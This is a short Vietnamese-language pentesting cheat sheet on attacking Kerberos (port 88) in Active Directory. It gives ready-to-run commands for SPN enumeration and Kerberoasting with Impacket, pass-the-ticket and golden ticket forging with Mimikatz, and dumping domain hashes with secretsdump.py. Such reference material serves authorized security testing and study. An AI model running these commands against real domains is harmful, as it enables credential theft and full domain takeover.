# Kerberos (Port 88)

## Enumeration

### Liệt kê Service Principal Names

Sử dụng GetUserSPNs.py từ Impacket để lấy thông tin SPN và tên người dùng hợp lệ:

```
python GetUserSPNs.py -request -dc-ip <ip> <domain>/<user>
```

***

## Attack Vectors

### Pass the Ticket

Sử dụng ticket Kerberos hợp lệ để xác thực bằng cách tiêm vào bộ nhớ với Mimikatz:

```
mimikatz "kerberos::ptt <ticket.kirbi>"
```

### Kerberoasting

Yêu cầu ticket dịch vụ từ tài khoản có SPN để bẻ khóa ngoại tuyến:

```
python GetUserSPNs.py -request -dc-ip <ip> <domain>/<user>
```

***

## Post-Exploitation

### Secret Dump

Trích xuất ticket, hàm băm và dữ liệu quan trọng từ hệ thống bằng secretsdump.py:

```
python secretsdump.py -just-dc <domain>/<user>:<password>@<ip>
```

### Golden Ticket Attack

Tạo ticket vàng để truy cập không giới hạn vào domain:

{% code overflow="wrap" %}

```
mimikatz "kerberos::golden /user:Administrator /domain:<domain> /sid:<sid> /krbtgt:<krbtgt_hash> /id:500"
```

{% endcode %}